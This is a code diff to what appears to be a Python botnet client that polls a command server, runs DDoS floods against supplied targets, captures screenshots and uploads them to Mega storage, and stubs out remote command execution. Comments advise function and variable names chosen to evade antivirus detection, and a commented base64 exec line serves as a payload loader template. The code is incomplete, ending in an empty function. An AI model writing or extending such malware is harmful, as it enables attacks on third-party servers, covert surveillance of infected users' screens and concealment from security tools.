@@ -1,4 +1,4 @@
-import base64, sys, time, urllib.request, socket, getpass, string, shutil, os, pyautogui, cv2
+import base64, sys, time, urllib.request, socket, getpass, string, shutil, os, pyautogui, cv2, platform
 from mega import Mega
 from datetime import datetime
 #exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('BASE64 ENCODED PROGRAM GOES HERE')))
@@ -20,6 +20,10 @@ from datetime import datetime
 #
 
 def main():
+    if (check_platform() == "32-bit"):
+        # TODO: implement a self-destruct function? (maybe)
+        pass
+
     URL = "https://website.tld" #NO SLASH AT THE END OF THE URL
     master_filename = "moses.exe"
 
@@ -56,15 +60,20 @@ def main():
 
     # start main program loop
     while (True):
+        # calling the variable signal seems to not trigger av, but it really should be command
         signal = get_web_content(URL, "1")
 
-        if (signal == "1"): # ddos_attack()
+        if (signal == "1"): # ddos_target()
             target = get_web_content(URL, "2")
             stop_time = get_web_content(URL, "3")
 
-            ddos_attack(target, stop_time)
-        elif (signal == "2"): # screenshot
+            ddos_target(target, stop_time)
+        elif (signal == "2"): # take_screenshot()
             take_screenshot(sys_username)
+        elif (signal == "3"): # get_pub_ip_address()
+            pass
+        elif (signal == "4"): # execute_command()
+            pass
         # TODO
         #elif (signal == "3"):
         #    download_file()
@@ -104,6 +113,11 @@ def check_if_file_exists_in_path(x, sys_username, master_filename):
 
     return file_exists
 
+def check_platform():
+    arch = platform.architecture()
+    arch = arch[0]
+    return arch
+
 def upload_file(filename):
     counter = 0
 
@@ -142,8 +156,8 @@ def download_file(filename):
 
 
 ###---COMMAND MODULES---###
-# NOTEt change back to im_living when done (evades antivirus)
-def ddos_attack(target, stop_time): # 1
+# NOTE: change back to im_living when done (evades antivirus)
+def ddos_target(target, stop_time): # 1
     source = str(socket.gethostbyname(socket.gethostname()))
     destination_port = 80
 
@@ -169,5 +183,12 @@ def take_screenshot(sys_username): # 2
     screenshot.save(filename)
 
     upload_file(filename)
+
+def execute_command(command):
+    # subprocess here... output the stdout to a variable, a text file, to mega, then remove
+    pass
+
+def get_pub_ip_address():
+    
 
 main()
